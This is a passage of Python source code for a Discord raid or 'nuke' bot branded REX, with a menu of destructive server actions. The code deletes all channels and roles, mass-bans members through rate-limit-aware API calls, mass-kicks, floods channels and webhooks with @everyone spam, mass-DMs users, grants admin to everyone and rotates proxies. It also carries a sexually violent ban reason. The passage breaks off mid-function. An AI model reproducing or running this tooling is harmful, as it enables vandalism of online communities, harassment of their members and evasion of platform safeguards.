import discord
from discord.ext import commands
import asyncio
from pystyle import Center, Colorate, Colors
import os
from colorama import Style
import time
import random
import urllib
import config
import json
import sys
import os
import logging
import datetime 
import aiohttp 

logging.getLogger('discord').setLevel(logging.ERROR)
logging.getLogger('aiohttp').setLevel(logging.ERROR)

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from config import SERVER_CONFIG

try:
    import uvloop
    uvloop.install()
except ImportError:
    pass

# ============================================ PROXY SETUP ============================================
PROXY_LIST = []
USE_PROXY = False

def load_proxies():
    global PROXY_LIST, USE_PROXY
    try:
        with open('proxies.txt', 'r') as f:
            PROXY_LIST = [line.strip() for line in f if line.strip()]
        if PROXY_LIST:
            USE_PROXY = True
            print(f"{Colors.green}[✓] {len(PROXY_LIST)} proxies loaded{Colors.reset}")
        else:
            print(f"{Colors.yellow}[!] proxies.txt empty, running without proxy{Colors.reset}")
    except FileNotFoundError:
        print(f"{Colors.yellow}[!] proxies.txt not found, running without proxy{Colors.reset}")

load_proxies()

def get_random_proxy():
    if USE_PROXY and PROXY_LIST:
        return random.choice(PROXY_LIST)
    return None
# ============================================ PROXY SETUP END ============================================

ascii_art = r"""
                                    @@@       @@@                               
@@@@@@@  @@@@@@@@ @@@  @@@         @@@       @@@       @@@@@    @@@@@    @@@@@  
@@!  @@@ @@!      @@!  !@@        @@@       @@@      @@!@     @@!@     @@!@     
@!@!!@!  @!!!:!    !@@!@!        !!@       !!@       @!@!@!@  @!@!@!@  @!@!@!@  
!!: :!!  !!:       !: :!!       !!!       !!!        !!:  !!! !!:  !!! !!:  !!! 
 :   : : : :: ::  :::  :::     :!:       :!:          : : ::   : : ::   : : ::  
                              : :       : :                                     
REX // 666                
"""

print(Colorate.Vertical(Colors.yellow_to_green, ascii_art))

print("  ")
print("  ")
print("  ")
print("  ")

# ============================================ TOKEN INPUT ============================================
print(Colorate.Horizontal(Colors.yellow_to_green, "🔐 ENTER BOT TOKEN ~ "))
bot_token = input(Colorate.Horizontal(Colors.yellow_to_green, "TOKEN ~ "))

# Validate token
if not bot_token or len(bot_token) < 50:
    print(Colorate.Horizontal(Colors.red_to_blue, "❌ INVALID TOKEN!"))
    time.sleep(3)
    exit()
else:
    print(Colorate.Horizontal(Colors.yellow_to_green, "✅ TOKEN ACCEPTED"))
    time.sleep(1)
    os.system('cls' if os.name == 'nt' else 'clear')

# ============================================ LOAD OTHER CONFIGS ============================================
try:
    with open('config.json') as f:
        config_data = json.load(f)
except:
    config_data = {}

server_id = input(Colorate.Horizontal(Colors.yellow_to_green, "ENTER GUILD ID ~ "))

intents = discord.Intents.all()
intents.guilds = True
bot = commands.Bot(command_prefix=".", intents=intents)

def viper():
    ascii_art = r"""
             _________________________  ___   ________ ________ ________
             \______   \_   _____/\   \/  /  /  _____//  _____//  _____/
              |       _/|    __)_  \     /  /   __  \/   __  \/   __  \ 
              |    |   \|        \ /     \  \  |__\  \  |__\  \  |__\  \
              |____|_  /_______  //___/\  \  \_____  /\_____  /\_____  /
                     \/        \/       \_/        \/       \/       \/ 
    """
    
    print(Colorate.Vertical(Colors.yellow_to_green, ascii_art))

def cc():
    os.system('cls' if os.name == 'nt' else 'clear')

@bot.event
async def on_ready():
    cc()
    viper()
    await show_menu()

async def show_menu():
    while True:
        menu_text = """
                  ╔════════════════════════════════════════════╗   
                  ║                                            ║
                  ║           * NEVER MESS WITH US *           ║
                  ║             ══════════════════             ║
                  ║                 @x_walter                  ║
                  ║                                            ║
                  ╚════════════════════════════════════════════╝

╔═══════════════════════════════════════════════════════════════════════════════╗ 
║                         ║                           ║                         ║ 
║   01 AUTO NUKE          ║   11 MSG SPAM ONLY        ║  21 UNNICK ALL          ║ 
║   02 WEBHOOK SPAM       ║   12 PRUNE MEMBERS        ║  22 SWITCH BOT          ║ 
║   03 CREATE ROLES       ║   13 UNBAN ALL            ║  23 CHANGE SV LOGO      ║ 
║   04 DELETE ROLES       ║   14 LOCK ALL CHANNELS    ║  24 DELETE ALL EMOJIES  ║ 
║   05 BAN ALL            ║   15 UNLOCK ALL CHANNELS  ║  25 DELETE ALL STICKERS ║ 
║   06 GET ADMIN          ║   16 SWITCH SERVER        ║  26 TIMEOUT ALL         ║ 
║   07 DM EVERYONE        ║   17 MASS KICK            ║  27 UNTIMEOUT ALL       ║
║   08 CREATE CHANNEL     ║   18 MASS DM ALL          ║  28 DELETE ALL WEBHOOKS ║
║   09 DELETE CHANNEL     ║   19 RENAME CHANNELS      ║  29 CREATE MASS THREADS ║
║   10 CHANGE SERVER INF  ║   20 NICK ALL MEMBERS     ║  30 EXIT                ║ 
║                         ║                           ║                         ║
╚═════════════════════════╝═══════════════════════════╚═════════════════════════╝
        """
        
        print(Colorate.Vertical(Colors.yellow_to_green, menu_text))
        
        choice = await bot.loop.run_in_executor(None, input, Colorate.Horizontal(Colors.yellow_to_green, "REX ~ "))

        if choice == '1' or choice == '01':
            await nuke(server_id)
        elif choice == '2' or choice == '02':
            await webhook_spam(server_id)
        elif choice == '3' or choice == '03':
            await create_roles(server_id)
        elif choice == '4' or choice == '04':
            await delete_roles(server_id)
        elif choice == '5' or choice == '05':
            await ban_all(server_id)
        elif choice == '6' or choice == '06':
            await get_admin(server_id)
        elif choice == '7' or choice == '07':
            await dm_all(server_id)
        elif choice == '8' or choice == '08':
            await create_channels(server_id)
        elif choice == '9' or choice == '09':
            await delete_channels(server_id)
        elif choice == '10':
            await change_server(server_id, bot)
        elif choice == '11':
            await msg_spam_only(server_id)
        elif choice == '12':
            await prune_members(server_id)
        elif choice == '13':
            await unban_all(server_id)
        elif choice == '14':
            await lock_all_channels(server_id)
        elif choice == '15':
            await unlock_all_channels(server_id)
        elif choice == '16':
            await shift_server()
        elif choice == '17':
            await mass_kick(server_id)
        elif choice == '18':
            await mass_dm_all(server_id)
        elif choice == '19':
            await rename_channels(server_id)
        elif choice == '20':
            await nick_change_all(server_id)
        elif choice == '21':
            await unnick_all(server_id)
        elif choice == '22':
            await switch_bot()
        elif choice == '23':
            await change_server_logo(server_id)
        elif choice == '24':
            await delete_all_emojis(server_id)
        elif choice == '25':
            await delete_all_stickers(server_id)
        elif choice == '26':
            await timeout_all_members(server_id)
        elif choice == '27':
            await untimeout_all_members(server_id)
        elif choice == '28':
            await delete_all_webhooks(server_id)
        elif choice == '29':
            await create_mass_threads(server_id)
        elif choice == '30':
            print(Colorate.Horizontal(Colors.yellow_to_green, "CLOSING THE TERMINAL..."))
            await bot.close()
            os._exit(0)
        elif choice.lower() == 'x':
            print(Colorate.Horizontal(Colors.yellow_to_green, "NOT AVAILABLE"))
            continue
        else:
            print(Colorate.Horizontal(Colors.yellow_to_green, "PLEASE PICK A VALID CHOICE"))
            continue
        
        await bot.loop.run_in_executor(None, input, Colorate.Horizontal(Colors.yellow_to_green, "PRESS ENTER TO RETURN TO THE MENU"))
        cc()
        viper()

async def delete_channels(server_id):
    try:
        guild = bot.get_guild(int(server_id))
    except ValueError:
        print((Colorate.Horizontal(Colors.yellow_to_green,f"[-] INVALID SERVER ID. PLEASE ENTER A NUMERIC ID.")))
        return

    if guild is None:
        print(Colorate.Horizontal(Colors.yellow_to_green, "[-] SERVER NOT FOUND."))
        return

    confirm = await asyncio.to_thread(input, (Colorate.Horizontal(Colors.yellow_to_green,(f"U WANNA DELETE EVERY CHANNEL? Y/N ~ "))))
    confirm = confirm.lower()
    if confirm != 'y':
        print((Colorate.Horizontal(Colors.yellow_to_green,"OPERATION CANCELED.")))
        return

    try:
        channels = guild.channels
        delete_tasks = [channel.delete() for channel in channels]
        await asyncio.gather(*delete_tasks)
        print((Colorate.Horizontal(Colors.yellow_to_green,f"[+] ALL CHANNELS DELETED SUCCESSFULLY.")))
    except Exception as e:
        print((Colorate.Horizontal(Colors.yellow_to_green,f"[-] ERROR DELETING CHANNELS: {e}")))

async def delete_roles(server_id):
    try:
        guild = bot.get_guild(int(server_id))
    except ValueError:
        print((Colorate.Horizontal(Colors.yellow_to_green,f"[-] INVALID SERVER ID. PLEASE ENTER A NUMERIC ID.")))
        return

    if guild is None:
        print(Colorate.Horizontal(Colors.yellow_to_green, "[-] SERVER NOT FOUND."))
        return

    confirm = await asyncio.to_thread(input, (Colorate.Horizontal(Colors.yellow_to_green,f"DO YOU WANT TO DELETE ALL ROLES? Y/N ~ ")))
    confirm = confirm.lower()
    if confirm != 'y':
        print((Colorate.Horizontal(Colors.yellow_to_green,"OPERATION CANCELED.")))
        return

    roles_to_delete = [role for role in guild.roles if role != guild.default_role]

    tasks = []
    for role in roles_to_delete:
        tasks.append(delete_role(role))

    results = await asyncio.gather(*tasks)

    for role, success in zip(roles_to_delete, results):
        if success:
            print((Colorate.Horizontal(Colors.yellow_to_green,f"[+] DELETED ROLE {role.name}")))
        else:
            print((Colorate.Horizontal(Colors.yellow_to_green,f"[-] FAILED TO DELETE ROLE {role.name}")))

async def delete_role(role):
    try:
        await role.delete()
        return True
    except discord.Forbidden:
        print((Colorate.Horizontal(Colors.yellow_to_green,f"[-] FAILED TO DELETE ROLE {role.name}. MISSING PERMISSIONS.")))
        return False
    except discord.HTTPException as e:
        print((Colorate.Horizontal(Colors.yellow_to_green,f"[-] FAILED TO DELETE ROLE {role.name} DUE TO HTTPEXCEPTION: {e}")))
        return False

async def nuke(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            start_time_total = time.time()  
            channel_futures = [delete_channel(channel) for channel in guild.channels]
            channel_results = await asyncio.gather(*channel_futures)
            end_time_total = time.time()  
            channels_deleted = channel_results.count(True)
            channels_not_deleted = channel_results.count(False)
            print((Colorate.Horizontal(Colors.yellow_to_green,f"[+] {channels_deleted} CHANNELS DELETED, {channels_not_deleted} CHANNELS NOT DELETED")))
            print((Colorate.Horizontal(Colors.yellow_to_green,"[+] AUTO NUKE COMPLETE - ROLES WERE NOT DELETED")))
            await auto_raid(server_id)
        else:
            print((Colorate.Horizontal(Colors.yellow_to_green,"[-] GUILD NOT FOUND.")))
    except Exception as e:
        print((Colorate.Horizontal(Colors.yellow_to_green,f"[-] ERROR: {e}")))

async def create_channels(server_id):
    try:
        guild = bot.get_guild(int(server_id))
    except ValueError:
        print((Colorate.Horizontal(Colors.yellow_to_green,f"[-] INVALID SERVER ID. PLEASE ENTER A NUMERIC ID.")))
        return

    if guild is None:
        print(Colorate.Horizontal(Colors.yellow_to_green, "[-] SERVER NOT FOUND."))
        return

    num_channels = await asyncio.to_thread(input, (Colorate.Horizontal(Colors.yellow_to_green,(f"HOW MANY CHANNELS ~ "))))
    try:
        num_channels = int(num_channels)
    except ValueError:
        print((Colorate.Horizontal(Colors.yellow_to_green,f"[-] INVALID NUMBER. PLEASE ENTER A NUMERIC VALUE.")))
        return

    base_name = await asyncio.to_thread(input, (Colorate.Horizontal(Colors.yellow_to_green,(f"CHANNEL NAMES ~ "))))

    tasks = []
    for i in range(num_channels):
        channel_name = f"{base_name}"
        tasks.append(create_text_channel(guild, channel_name))

    await asyncio.gather(*tasks)

async def create_text_channel(guild, channel_name):
    try:
        channel = await guild.create_text_channel(channel_name)
        print((Colorate.Horizontal(Colors.yellow_to_green,f"[+] CHANNEL CREATED: {channel.name}")))
    except Exception as e:
        print((Colorate.Horizontal(Colors.yellow_to_green,f"[-] FAILED TO CREATE CHANNEL '{channel_name}': {e}")))

async def spam_channel(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            num_messages = int(input((Colorate.Horizontal(Colors.yellow_to_green,f"HOW MANY MESSAGES? ~ "))))
            message_content = input((Colorate.Horizontal(Colors.yellow_to_green,f"CUSTOM MESSAGE OR EMBED ~ ")))

            include_everyone = False
            if message_content.lower() == 'embed':
                include_everyone_input = input((Colorate.Horizontal(Colors.yellow_to_green,f"@everyone Y/N ~"))).lower()
                include_everyone = include_everyone_input == 'y'

            start_time_total = time.time()
            tasks = [
                send_messages_to_channels(channel, num_messages, message_content, include_everyone)
                for channel in guild.channels
                if isinstance(channel, discord.TextChannel)
            ]

            await asyncio.gather(*tasks)
            end_time_total = time.time()

            print((Colorate.Horizontal(Colors.yellow_to_green,f"[+] {num_messages} MESSAGES SENT TO ALL TEXT CHANNELS - TOTAL TIME TAKEN: {end_time_total - start_time_total:.2f} seconds")))
        else:
            print((Colorate.Horizontal(Colors.yellow_to_green,f"[-] GUILD NOT FOUND.")))
    except Exception as e:
        print((Colorate.Horizontal(Colors.yellow_to_green,f"[-] ERROR: {e}")))

async def send_messages_to_channels(channel, num_messages, message_content, include_everyone):
    try:
        for _ in range(num_messages):
            if message_content.lower() == 'embed':
                await send_embed(channel, include_everyone)
            else:
                await channel.send(message_content)
                print((Colorate.Horizontal(Colors.yellow_to_green,f"[+] MESSAGE SENT TO {channel.name}: {message_content}")))
    except Exception as e:
        print((Colorate.Horizontal(Colors.yellow_to_green,f"[-] CAN'T SEND MESSAGES TO {channel.name}: {e}")))

async def send_embed(channel, include_everyone=False):
    try:
        embed_config = config.EMBED_CONFIG

        embed = discord.Embed(
            title=embed_config.get("title", ""),
            description=embed_config.get("description", ""),
            color=embed_config.get("color", 0),
        )

        for field in embed_config.get("fields", []):
            embed.add_field(name=field["name"], value=field["value"], inline=field.get("inline", False))

        embed.set_image(url=embed_config.get("image", ""))
        embed.set_footer(text=embed_config.get("footer", ""))

        if include_everyone:
            message = f"@everyone {embed_config.get('message', '')}"
        else:
            message = embed_config.get('message', '')

        await channel.send(content=message, embed=embed)
        print((Colorate.Horizontal(Colors.yellow_to_green,f"[+] EMBED SENT TO {channel.name}")))
    except Exception as e:
        print((Colorate.Horizontal(Colors.yellow_to_green,f"[-] CAN'T SEND EMBED TO {channel.name}: {e}")))

from config import NO_BAN_KICK_ID

async def ban_all(server_id):
    """FAST BAN - Real time progress, sabse fast"""
    import datetime
    
    try:
        guild = bot.get_guild(int(server_id))
    except ValueError:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] INVALID SERVER ID."))
        return

    if guild is None:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] SERVER NOT FOUND."))
        return

    confirm = await asyncio.to_thread(input, Colorate.Horizontal(Colors.red_to_blue, "BAN ALL MEMBERS? Y/N ~ "))
    if confirm.lower() != "y":
        return

    print(Colorate.Horizontal(Colors.yellow_to_green, "[+] FETCHING MEMBERS..."))
    
    member_ids = []
    last_user_id = "0"
    
    async with aiohttp.ClientSession() as session:
        while True:
            headers = {"Authorization": f"Bot {bot_token}"}
            url = f"https://discord.com/api/v9/guilds/{server_id}/members?limit=1000&after={last_user_id}"
            
            try:
                async with session.get(url, headers=headers, timeout=10) as response:
                    if response.status == 429:
                        data = await response.json()
                        await asyncio.sleep(data.get('retry_after', 1))
                        continue
                    
                    if response.status != 200:
                        break
                    
                    chunk = await response.json()
                    if not chunk:
                        break
                    
                    for member in chunk:
                        member_ids.append(str(member['user']['id']))
                    
                    last_user_id = chunk[-1]['user']['id']
                    print(Colorate.Horizontal(Colors.yellow_to_green, f"[+] Fetched {len(member_ids)} members..."))
                    await asyncio.sleep(0.1)
                    
            except:
                continue
    
    print(Colorate.Horizontal(Colors.yellow_to_green, f"[+] Total members: {len(member_ids)}"))
    print(Colorate.Horizontal(Colors.red_to_blue, "[+] STARTING FAST BAN..."))
    print(Colorate.Horizontal(Colors.yellow_to_green, "-" * 50))
    
    banned = 0
    failed = 0
    start_time = time.time()
    
    async with aiohttp.ClientSession() as session:
        batch_size = 50
        for i in range(0, len(member_ids), batch_size):
            batch = member_ids[i:i+batch_size]
            tasks = []
            
            for member_id in batch:
                url = f"https://discord.com/api/v9/guilds/{server_id}/bans/{member_id}"
                headers = {"Authorization": f"Bot {bot_token}"}
                data = {"delete_message_days": 0, "reason": "RAPED BY REX"}
                tasks.append(session.put(url, headers=headers, json=data))
            
            responses = await asyncio.gather(*tasks, return_exceptions=True)
            
            for j, resp in enumerate(responses):
                member_id = batch[j]
                now = datetime.datetime.now()
                timestamp = now.strftime("%Y-%m-%d %H:%M:%S")
                
                if isinstance(resp, Exception):
                    failed += 1
                    print(f"{timestamp} [Ban] {banned + failed}/{len(member_ids)} Member [{member_id}] Failed")
                elif resp.status == 204:
                    banned += 1
                    print(f"{timestamp} [Ban] {banned}/{len(member_ids)} Member [{member_id}] Banned successfully !")
                elif resp.status == 429:
                    resp_data = await resp.json()
                    wait = resp_data.get('retry_after', 1)
                    print(f"{timestamp} [Ban] Rate limited! Waiting {wait}s...")
                    await asyncio.sleep(wait)
                    async with session.put(url, headers=headers, json=data) as retry:
                        if retry.status == 204:
                            banned += 1
                            print(f"{timestamp} [Ban] {banned}/{len(member_ids)} Member [{member_id}] Banned (retry) !")
                        else:
                            failed += 1
                else:
                    failed += 1
            
            await asyncio.sleep(0.05)
    
    end_time = time.time()
    elapsed = end_time - start_time
    speed = banned / elapsed if elapsed > 0 else 0
    
    print(Colorate.Horizontal(Colors.yellow_to_green, "-" * 50))
    print(Colorate.Horizontal(Colors.green_to_blue, f"\n[+] COMPLETE! Banned: {banned} | Failed: {failed} | Total: {len(member_ids)} | Time: {elapsed:.1f}s | Speed: {int(speed)} bans/sec"))
    
    with open('members.txt', 'w') as f:
        f.write('\n'.join(member_ids))

async def dm_all(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            num_messages = int(input(Colorate.Horizontal(Colors.yellow_to_green, "HOW MANY MESSAGES TO SEND (MAX 20) ~ ")))
            if num_messages > 20:
                num_messages = 20
            message_content = input(Colorate.Horizontal(Colors.yellow_to_green, "MESSAGE TO EVERYONE ~ "))

            members_sent = 0
            members_fail = 0

            start_time_total = time.time()
            count = 0
            for member in guild.members:
                if count >= num_messages:
                    break
                if not member.bot:
                    try:
                        start_time_member = time.time()
                        for _ in range(num_messages):
                            await member.send(message_content)
                            end_time_member = time.time()
                            print(Colorate.Horizontal(Colors.yellow_to_green, f"[+] MESSAGE SENT TO {member.name} - TIME TAKEN: {end_time_member - start_time_member:.2f} SECONDS"))
                            members_sent += 1
                        count += 1
                    except Exception as e:
                        print(Colorate.Horizontal(Colors.yellow_to_green, f"[-] CAN'T SEND MESSAGE TO {member.name}: {e}"))
                        members_fail += 1

            end_time_total = time.time()
            print(Colorate.Horizontal(Colors.yellow_to_green, f"[-] COMMAND USED: DM ALL - {members_sent} MESSAGES SENT, {members_fail} MESSAGES FAILED - TOTAL TIME TAKEN: {end_time_total - start_time_total:.2f} SECONDS"))
        else:
            print(Colorate.Horizontal(Colors.yellow_to_green, "[-] GUILD NOT FOUND."))
    except Exception as e:
        print(Colorate.Horizontal(Colors.yellow_to_green, f"[-] ERROR: {e}"))

from config import NO_BAN_KICK_ID

async def kick_all(server_id, bot_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            confirm = input((Colorate.Horizontal(Colors.yellow_to_green,f"KICK ALL MEMBERS Y/N ~ "))).lower()
            if confirm == "y":
                start_time_total = time.time()
                tasks = [
                    kick_member(member, bot_id)
                    for member in guild.members
                ]
                results = await asyncio.gather(*tasks)
                end_time_total = time.time()

                members_kicked = results.count(True)
                members_failed = results.count(False)

                print((Colorate.Horizontal(Colors.yellow_to_green,f"[+] {members_kicked} MEMBERS KICKED, {members_failed} MEMBERS NOT KICKED - TOTAL TIME TAKEN: {end_time_total - start_time_total:.2f} SECONDS")))
            else:
                print((Colorate.Horizontal(Colors.yellow_to_green,f"[-] KICK ALL OPERATION CANCELED.")))
        else:
            print((Colorate.Horizontal(Colors.yellow_to_green,f"[-] GUILD NOT FOUND.")))
    except Exception as e:
        print((Colorate.Horizontal(Colors.yellow_to_green,f"[-] ERROR: {e}")))

async def kick_member(member, bot_id):
    try:
        if member.id not in NO_BAN_KICK_ID and member.id != bot_id:
            await member.kick()
            print((Colorate.Horizontal(Colors.yellow_to_green,f"[+] MEMBER {member.name} KICKED")))
            return True
        else:
            if member.id == bot_id:
                pass
            else:
                print((Colorate.Horizontal(Colors.yellow_to_green,f"[-] MEMBER {member.name} IS IN THE WHITELIST, NO KICK.")))
            return False
    except Exception as e:
        print((Colorate.Horizontal(Colors.yellow_to_green,f"[-] CAN'T KICK {member.name}: {e}")))
        return False
    
async def get_admin(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            user_id_or_all = input((Colorate.Horizontal(Colors.yellow_to_green,f"USER ID OR ENTER FOR EVERYONE ~ ")))

            color = discord.Colour.from_rgb(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))

            start_time_total = time.time()  

            admin_role = await guild.create_role(name="Admin", colour=color, permissions=discord.Permissions.all())

            if not user_id_or_all:
                for member in guild.members:
                    try:
                        if not member.bot:
                            start_time_member = time.time()  
                            await member.add_roles(admin_role)
                            end_time_member = time.time()  
                            print((Colorate.Horizontal(Colors.yellow_to_green,f"[+] ADMIN ROLE GRANTED TO {member.name} - TIME TAKEN: {end_time_member - start_time_member:.2f} SECONDS")))
                    except Exception as e:
                        print((Colorate.Horizontal(Colors.yellow_to_green,f"[-] CAN'T GRANT ADMIN ROLE TO {member.name}: {e}")))

                end_time_total = time.time() 
                print((Colorate.Horizontal(Colors.yellow_to_green,f"[+] COMMAND USED: GET ADMIN - ADMIN ROLE GRANTED TO THE ENTIRE SERVER - TOTAL TIME TAKEN: {end_time_total - start_time_total:.2f} SECONDS")))

            else:
                try:
                    user_id = int(user_id_or_all)
                    target_user = await guild.fetch_member(user_id)
                    if target_user:
                        start_time_target_user = time.time()
                        await target_user.add_roles(admin_role)
                        end_time_target_user = time.time()
                        print((Colorate.Horizontal(Colors.yellow_to_green,f"[+] ADMIN ROLE GRANTED TO {target_user.name} - TIME TAKEN: {end_time_target_user - start_time_target_user:.2f} SECONDS")))
                        print((Colorate.Horizontal(Colors.yellow_to_green,f"[+] COMMAND USED: GET ADMIN - ADMIN ROLE GRANTED TO THE ENTIRE SERVER - TOTAL TIME TAKEN: {end_time_target_user - start_time_target_user:.2f} SECONDS")))
                    else:
                        print((Colorate.Horizontal(Colors.yellow_to_green,f"[-] USER WITH ID {user_id_or_all} NOT FOUND.")))

                except ValueError:
                    print((Colorate.Horizontal(Colors.yellow_to_green,f"[-] INVALID USER ID. PLEASE ENTER A VALID USER ID OR PRESS ENTER FOR THE ENTIRE SERVER.")))

        else:
            print((Colorate.Horizontal(Colors.yellow_to_green,f"[-] GUILD NOT FOUND.")))
    except Exception as e:
        print((Colorate.Horizontal(Colors.yellow_to_green,f"[-] ERROR: {e}")))


async def change_server(server_id, bot):
    try:
        guild = bot.get_guild(int(server_id))
        if not guild:
            print(Colorate.Horizontal(Colors.yellow_to_green, "[-] GUILD NOT FOUND."))
            return

        server_config = config.SERVER_CONFIG
        new_name = server_config.get('new_name', guild.name)
        new_icon_url = server_config.get('new_icon', None)

        start_time = asyncio.get_event_loop().time()

        tasks = [guild.edit(name=new_name)]
        print(Colorate.Horizontal(Colors.yellow_to_green, f"[+] SERVER NAME CHANGED TO {new_name}"))

        if new_icon_url:
            async with aiohttp.ClientSession() as session:
                try:
                    async with session.get(new_icon_url) as response:
                        if response.status == 200:
                            icon_data = await response.read()
                            tasks.append(guild.edit(icon=icon_data))
                            print(Colorate.Horizontal(Colors.yellow_to_green, "[+] SERVER ICON CHANGED"))
                        else:
                            print(Colorate.Horizontal(Colors.yellow_to_green, f"[-] FAILED TO FETCH ICON: HTTP {response.status}"))
                except Exception as e:
                    print(Colorate.Horizontal(Colors.yellow_to_green, f"[-] ERROR FETCHING ICON: {e}"))

        elif not new_icon_url:
            icon_path = input(Colorate.Horizontal(Colors.yellow_to_green, "Enter path for new icon (or press Enter to skip): ")).strip()
            if icon_path and os.path.exists(icon_path) and icon_path.lower().endswith(('.jpg', '.png')):
                try:
                    with open(icon_path, "rb") as icon_file:
                        icon_data = icon_file.read()
                    tasks.append(guild.edit(icon=icon_data))
                    print(Colorate.Horizontal(Colors.yellow_to_green, "[+] SERVER ICON CHANGED FROM FILE"))
                except Exception as e:
                    print(Colorate.Horizontal(Colors.yellow_to_green, f"[-] FAILED TO CHANGE ICON FROM FILE: {e}"))
            else:
                print(Colorate.Horizontal(Colors.yellow_to_green, "[-] NO VALID ICON PROVIDED. SKIPPING ICON UPDATE."))

        await asyncio.gather(*tasks)

        end_time = asyncio.get_event_loop().time()
        print(Colorate.Horizontal(Colors.yellow_to_green, f"[+] SERVER INFORMATION UPDATED SUCCESSFULLY - TIME TAKEN: {end_time - start_time:.2f} SECONDS"))

    except discord.HTTPException as e:
        if e.status == 429:
            retry_after = int(e.retry_after) if hasattr(e, "retry_after") else 10
            print(Colorate.Horizontal(Colors.yellow_to_green, f"[-] RATE LIMITED. WAITING {retry_after} SECONDS BEFORE RETRY..."))
            await asyncio.sleep(retry_after)
            await change_server(server_id, bot)
        else:
            print(Colorate.Horizontal(Colors.yellow_to_green, f"[-] HTTP ERROR: {e}"))
    except Exception as e:
        print(Colorate.Horizontal(Colors.yellow_to_green, f"[-] GENERAL ERROR: {e}"))

async def spam_webhooks(guild):
    try:
        webhook_config = config.WEBHOOK_CONFIG

        webhooks = []
        for channel in guild.channels:
            if isinstance(channel, discord.TextChannel):
                webhook_name = webhook_config["default_name"]
                webhook = await channel.create_webhook(name=webhook_name)
                print((Colorate.Horizontal(Colors.yellow_to_green,f"[+] WEBHOOK CREATED FOR {channel.name}: {webhook.name}")))
                webhooks.append(webhook)

        num_messages = int(input((Colorate.Horizontal(Colors.yellow_to_green,f"NUMBER OF MESSAGES ~ "))))

        message_content = input((Colorate.Horizontal(Colors.yellow_to_green,f"ENTER MESSAGE OR EMBED ~ ")))

        include_everyone = False
        if message_content.lower() == 'embed':
            include_everyone_input = input((Colorate.Horizontal(Colors.yellow_to_green,f"@everyone Y/N ~ "))).lower()
            include_everyone = include_everyone_input == 'yes'
        start_time_spam = time.time()
        tasks = [
            send_embed_webhook(webhook, num_messages, message_content, include_everyone)
            if message_content.lower() == 'embed'
            else send_regular_webhook(webhook, num_messages, message_content)
            for webhook in webhooks
        ]
        await asyncio.gather(*tasks)
        end_time_target_spam = time.time()

        print((Colorate.Horizontal(Colors.yellow_to_green,f"[+] COMMAND USED: SPAM - {num_messages} MESSAGES SENT VIA WEBHOOKS - TOTAL TIME TAKEN: {end_time_target_spam - start_time_spam:.2f} SECONDS")))
    except Exception as e:
        print((Colorate.Horizontal(Colors.yellow_to_green,f"[-] ERROR: {e}")))

async def send_embed_webhook(webhook, num_messages, message_content, include_everyone):
    try:
        for _ in range(num_messages):
            await send_embed_webhook_message(webhook, include_everyone)
    except Exception as e:
        print((Colorate.Horizontal(Colors.yellow_to_green,f"[-] CAN'T SEND MESSAGES VIA WEBHOOK {webhook.name}: {e}")))

async def send_embed_webhook_message(webhook, include_everyone):
    try:
        embed_config = config.EMBED_CONFIG

        embed = discord.Embed(
            title=embed_config.get("title", ""),
            description=embed_config.get("description", ""),
            color=embed_config.get("color", 0),
        )

        for field in embed_config.get("fields", []):
            embed.add_field(name=field["name"], value=field["value"], inline=field.get("inline", False))

        embed.set_image(url=embed_config.get("image", ""))
        embed.set_footer(text=embed_config.get("footer", ""))

        if include_everyone:
            message = f"@everyone {embed_config.get('message', '')}"
        else:
            message = embed_config.get('message', '')

        await webhook.send(content=message, embed=embed)
        print((Colorate.Horizontal(Colors.yellow_to_green,f"[+] EMBED SENT VIA WEBHOOK {webhook.name}")))
    except Exception as e:
        print((Colorate.Horizontal(Colors.yellow_to_green,f"[-] CAN'T SEND EMBED VIA WEBHOOK {webhook.name}: {e}")))

async def send_regular_webhook(webhook, num_messages, message_content):
    try:
        for _ in range(num_messages):
            await webhook.send(content=message_content)
            print((Colorate.Horizontal(Colors.yellow_to_green,f"[+] MESSAGE SENT VIA WEBHOOK {webhook.name}: {message_content}")))
    except Exception as e:
        print((Colorate.Horizontal(Colors.yellow_to_green,f"[-] CAN'T SEND MESSAGES VIA WEBHOOK {webhook.name}: {e}")))

async def webhook_spam(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            await spam_webhooks(guild)
        else:
            print((Colorate.Horizontal(Colors.yellow_to_green,f"[-] GUILD NOT FOUND.")))
    except Exception as e:
        print((Colorate.Horizontal(Colors.yellow_to_green,f"[-] ERROR: {e}")))

from config import AUTO_RAID_CONFIG

def log_message(message):
    print((message))

async def delete_channel(channel):
    try:
        start_time = time.time()
        await channel.delete()
        end_time = time.time()
        log_message((Colorate.Horizontal(Colors.yellow_to_green,f"[+] CHANNEL {channel.name} DELETED - TIME TAKEN: {end_time - start_time:.2f} SECONDS")))
        return True
    except discord.NotFound:
        log_message((Colorate.Horizontal(Colors.yellow_to_green,f"[+] CHANNEL {channel.name} NOT FOUND OR ALREADY DELETED.")))
        return False
    except discord.Forbidden:
        log_message((Colorate.Horizontal(Colors.yellow_to_green,f"[+] PERMISSION DENIED TO DELETE CHANNEL {channel.name}.")))
        return False
    except Exception as e:
        log_message((Colorate.Horizontal(Colors.yellow_to_green,f"[+] ERROR DELETING CHANNEL {channel.name}: {e}")))
        return False

async def create_channel(guild, channel_type, channel_name):
    try:
        start_time = time.time()
        if channel_type == 'text':
            new_channel = await guild.create_text_channel(channel_name)
        elif channel_type == 'voice':
            new_channel = await guild.create_voice_channel(channel_name)

        end_time = time.time()
        log_message((Colorate.Horizontal(Colors.yellow_to_green,f"[+] CHANNEL CREATED: {new_channel.name} - TIME TAKEN: {end_time - start_time:.2f} SECONDS")))
        return new_channel
    except Exception as e:
        log_message((Colorate.Horizontal(Colors.yellow_to_green,f"[+] CAN'T CREATE {channel_type} CHANNEL: {e}")))
        return None
    
async def send_messages_to_channel(channel, num_messages, message_content, include_everyone):
    try:
        for i in range(num_messages):
            await channel.send(message_content)
            log_message((Colorate.Horizontal(Colors.yellow_to_green,f"[+] MESSAGE {i+1}/{num_messages} SENT TO CHANNEL {channel.name}")))
        return True
    except Exception as e:
